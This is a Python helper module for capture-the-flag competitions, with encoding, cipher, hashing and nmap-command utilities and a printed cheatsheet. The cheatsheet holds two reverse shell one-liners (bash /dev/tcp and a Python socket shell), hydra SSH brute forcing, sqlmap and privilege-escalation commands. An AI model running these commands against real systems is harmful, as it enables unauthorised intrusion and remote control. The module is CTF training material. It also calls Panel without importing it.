# ctf_helpers.py — CarapauCracker CTF Helper Functions
"""
Quick helper functions for CTF competitions
Essential utilities for speed and efficiency
"""
import base64
import binascii
import hashlib
import urllib.parse
from typing import List, Optional
from rich.console import Console
from rich.table import Table
from pathlib import Path

console = Console()


def decode_base64(data: str) -> str:
    """Decode base64 string"""
    try:
        return base64.b64decode(data).decode('utf-8')
    except:
        return base64.b64decode(data)


def encode_base64(data: str) -> str:
    """Encode string to base64"""
    return base64.b64encode(data.encode()).decode()


def decode_hex(data: str) -> str:
    """Decode hex string"""
    try:
        return bytes.fromhex(data).decode('utf-8')
    except:
        return bytes.fromhex(data).decode('latin-1')


def encode_hex(data: str) -> str:
    """Encode string to hex"""
    return data.encode().hex()


def decode_url(data: str) -> str:
    """URL decode"""
    return urllib.parse.unquote(data)


def encode_url(data: str) -> str:
    """URL encode"""
    return urllib.parse.quote(data)


def rot13(text: str) -> str:
    """ROT13 cipher"""
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
        else:
            result.append(char)
    return ''.join(result)


def caesar_cipher(text: str, shift: int) -> str:
    """Caesar cipher with custom shift"""
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr((ord(char) - ord('a') + shift) % 26 + ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr((ord(char) - ord('A') + shift) % 26 + ord('A')))
        else:
            result.append(char)
    return ''.join(result)


def hash_string(data: str, algorithm: str = "md5") -> str:
    """Hash string with various algorithms"""
    algorithms = {
        "md5": hashlib.md5,
        "sha1": hashlib.sha1,
        "sha256": hashlib.sha256,
        "sha512": hashlib.sha512,
    }
    
    if algorithm.lower() not in algorithms:
        return f"Unknown algorithm: {algorithm}"
    
    return algorithms[algorithm.lower()](data.encode()).hexdigest()


def identify_hash(hash_value: str) -> List[str]:
    """
    Identify hash type based on length and format
    
    Args:
        hash_value: Hash to identify
    
    Returns:
        List of possible hash types
    """
    length = len(hash_value)
    possible = []
    
    # Common hash lengths
    hash_types = {
        32: ["MD5", "NTLM"],
        40: ["SHA1"],
        56: ["SHA224"],
        64: ["SHA256", "SHA3-256"],
        96: ["SHA384", "SHA3-384"],
        128: ["SHA512", "SHA3-512"],
    }
    
    if length in hash_types:
        possible.extend(hash_types[length])
    
    # Check if it's base64 encoded
    try:
        base64.b64decode(hash_value)
        possible.append("Base64")
    except:
        pass
    
    return possible if possible else ["Unknown"]


def quick_scan(target: str, common_ports: bool = True) -> str:
    """
    Quick scan for CTF (faster, less verbose)
    
    Args:
        target: Target IP
        common_ports: Scan only common ports
    
    Returns:
        Quick scan command
    """
    if common_ports:
        ports = "21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080"
        return f"nmap -p {ports} -sV -sC -T4 {target}"
    else:
        return f"nmap -p- -sV -sC -T4 {target}"


def generate_wordlist_from_file(file_path: str, output: str = "wordlist.txt") -> bool:
    """
    Generate wordlist from file (extract words)
    
    Args:
        file_path: Input file
        output: Output wordlist file
    
    Returns:
        True if successful
    """
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            words = set()
            for line in f:
                # Extract words (alphanumeric sequences)
                import re
                words.update(re.findall(r'\b\w+\b', line.lower()))
        
        with open(output, 'w') as f:
            f.write('\n'.join(sorted(words)))
        
        console.print(f"[green][✓] Generated wordlist: {output} ({len(words)} words)[/green]")
        return True
    except Exception as e:
        console.print(f"[red][✘] Error: {e}[/red]")
        return False


def ctf_cheatsheet():
    """Display CTF cheatsheet"""
    cheatsheet = """
╔══════════════════════════════════════════════════════════════╗
║                    CTF QUICK REFERENCE                        ║
╚══════════════════════════════════════════════════════════════╝

🔍 RECONNAISSANCE:
  nmap -sC -sV -p- <target>
  masscan -p1-65535 <target> --rate=1000
  gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

🌐 WEB:
  sqlmap -u "http://<target>/page?id=1" --dbs
  burpsuite (intercept & modify)
  nikto -h http://<target>
  
🔑 CREDENTIALS:
  hydra -l admin -P rockyou.txt <target> ssh
  john --wordlist=rockyou.txt hash.txt
  hashcat -m 0 hash.txt rockyou.txt

💣 EXPLOITATION:
  searchsploit <service> <version>
  msfconsole
  python3 exploit.py

📦 REVERSE SHELL:
  bash -i >& /dev/tcp/<ip>/<port> 0>&1
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

🔐 PRIVILEGE ESCALATION:
  sudo -l
  find / -perm -4000 2>/dev/null
  linpeas.sh / lse.sh
  winpeas.exe

📝 ENCODING/DECODING:
  base64 -d file.txt
  echo "text" | base64
  xxd -r -p hex.txt
  strings binary
"""
    console.print(Panel(cheatsheet, title="[bold cyan]CTF Cheatsheet[/bold cyan]", border_style="cyan"))
